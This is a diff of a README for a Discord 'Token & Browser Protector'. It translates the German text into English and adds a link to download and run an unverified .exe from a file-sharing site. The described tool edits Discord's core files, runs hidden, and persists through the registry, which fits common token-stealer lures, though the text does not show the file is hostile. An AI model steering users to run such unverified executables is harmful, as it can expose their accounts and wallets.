@@ -1,36 +1,43 @@
 # Token & Browser Protector 🛡️
 
-Ein All-in-One Security Tool, das dich proaktiv vor Discord Token-Grabbern, bösartigen Scripts und Clipboard-Hijackern schützt. 
+An all-in-one security tool that proactively protects you from Discord token grabbers, malicious scripts, and clipboard hijackers.
+
+## 📥 Download
+
+**[📥 Click here to Download the latest version]([https://workupload.com/start/bzfwBXNwrpu])**
+*(Note: Replace the link above with your actual download link)*
+
+---
 
 ## ✨ Features
 
 ### 1. Discord Core & Sandbox Protection
-Moderne Token-Grabber und Malware greifen Discord direkt an, um Passwörter und Tokens zu stehlen. Dieses Tool blockiert diese Angriffe auf zwei Ebenen:
-- **`app.asar` Sandboxing:** Erstellt einen isolierten "Tresor"-Ordner für die Discord-Sitzung. Ein Virus findet an der üblichen Stelle in `AppData` keinen Token mehr.
-- **`discord_desktop_core` Auto-Heal:** Das Tool überprüft bei jedem Start die berüchtigte `index.js`, in die sich fast alle Token-Grabber einschleusen. Findet es Schadcode, wird dieser gelöscht, die Datei wird in ihren Originalzustand zurückversetzt ("geheilt") und anschließend über das Windows-System schreibgeschützt (Read-Only). 
-- **Unterstützte Clients:** Discord Stable, PTB, Canary, Development, Lightcord, ArmCord, Vesktop.
+Modern token grabbers and malware directly attack Discord to steal passwords and tokens. This tool blocks these attacks on two levels:
+- **`app.asar` Sandboxing:** Creates an isolated "vault" folder for the Discord session. A virus will no longer find a token in the usual `AppData` location.
+- **`discord_desktop_core` Auto-Heal:** On every startup, the tool checks the notorious `index.js` file, which is targeted by almost all token grabbers. If malicious code is found, it deletes it, restores the file to its original state ("heals" it), and subsequently locks it as Read-Only via the Windows file system.
+- **Supported Clients:** Discord Stable, PTB, Canary, Development, Lightcord, ArmCord, Vesktop.
 
 ### 2. Anti-Clipboard-Hijacker (Clipper Protection)
-Clipboard-Hijacker laufen unsichtbar im Hintergrund und warten darauf, dass du eine Krypto-Adresse (z. B. für eine Überweisung) kopierst. In Millisekunden tauschen sie deine kopierte Adresse gegen die Adresse des Hackers aus.
-- Unser Tool läuft (wenn in den Einstellungen aktiviert) komplett unsichtbar im Hintergrund.
-- Es scannt die Zwischenablage in Echtzeit nach BTC, ETH, LTC, XMR, TRX und SOL Adressen.
-- Wenn eine Adresse in unter 1,5 Sekunden gegen eine *andere* Krypto-Adresse ausgetauscht wird, **blockiert das Tool den Virus**, stellt deine originale Adresse sofort wieder her und warnt dich mit einem Windows-Popup!
+Clipboard hijackers run invisibly in the background and wait for you to copy a cryptocurrency address (e.g., for a transaction). In milliseconds, they swap your copied address with the hacker's address.
+- Our tool runs completely invisibly in the background (when enabled in settings).
+- It scans the clipboard in real-time for BTC, ETH, LTC, XMR, TRX, and SOL addresses.
+- If an address is swapped for a *different* crypto address in under 1.5 seconds, the tool **blocks the virus**, instantly restores your original address, and warns you with a native Windows popup!
 
 ### 3. Auto-Start (Persistence)
-- Du kannst das Tool so konfigurieren, dass es sich nahtlos in den Windows-Systemstart (Registry) integriert. 
-- Es startet im Hintergrund (ohne störendes Fenster), überprüft blitzschnell Discord auf neue Infektionen, heilt diese gegebenenfalls und aktiviert den Anti-Clipboard-Hijacker.
+- You can configure the tool to seamlessly integrate into the Windows startup (Registry).
+- It starts in the background (without a visible window), lightning-fast checks Discord for new infections, heals them if necessary, and activates the Anti-Clipboard-Hijacker.
 
-## 🚀 Installation & Nutzung
+## 🚀 Installation & Usage
 
-Das Tool wurde als Standalone `.exe` kompiliert, sodass du weder Python noch andere Module installieren musst.
+The tool has been compiled as a standalone `.exe`, so you don't need to install Python or any other dependencies.
 
-1. Öffne den Ordner `dist` (nach der Kompilierung).
-2. Starte die Datei **`TokenProtector.exe`**.
-3. **Im Dashboard:**
-   - **Tab "Discord Protect":** Zeigt dir an, ob dein Discord infiziert oder geschützt ist. Klicke auf "Protect", um den Schutz scharfzuschalten.
-   - **Tab "Browser Protect":** *(Aktuell im Ausbau)* Hier wird bald der direkte Datei-Lock für Chrome/Edge Cookies eingebaut.
-   - **Tab "Clipboard Protect":** Setze den Haken bei "Enable Anti-Clipboard-Hijacker", damit das Tool im Hintergrund auf Viren aufpasst.
-4. Setze ganz unten den Haken bei **"Enable Auto-Protection on PC Restart"**, damit du nach einem PC-Neustart nicht mehr an das Tool denken musst.
+1. **Download** the `TokenProtector.exe` from the link above.
+2. Run the file **`TokenProtector.exe`**.
+3. **In the Dashboard:**
+   - **"Discord Protect" Tab:** Shows you whether your Discord is infected or protected. Click on "Protect" to arm the protection.
+   - **"Browser Protect" Tab:** *(Currently under construction)* The direct file lock for Chrome/Edge cookies will be implemented here soon.
+   - **"Clipboard Protect" Tab:** Check the box for "Enable Anti-Clipboard-Hijacker" so the tool watches out for viruses in the background.
+4. Check the box at the very bottom for **"Enable Auto-Protection on PC Restart"** so you don't have to think about the tool after rebooting your PC.
 
-## ⚠️ Warnung
-Dieses Tool verändert Kern-Dateien von Discord, um sie vor Hackern zu sperren. Wenn es ein offizielles Discord-Update gibt, kann es in seltenen Fällen sein, dass Discord meckert. In diesem Fall öffnest du einfach das Tool, klickst auf **"Unprotect"**, lässt Discord updaten und klickst danach wieder auf **"Protect"**.
+## ⚠️ Warning
+This tool modifies core files of Discord to lock them away from hackers. When there is an official Discord update, Discord might occasionally fail to update. In this case, simply open the tool, click on **"Unprotect"**, let Discord update normally, and then click on **"Protect"** again.
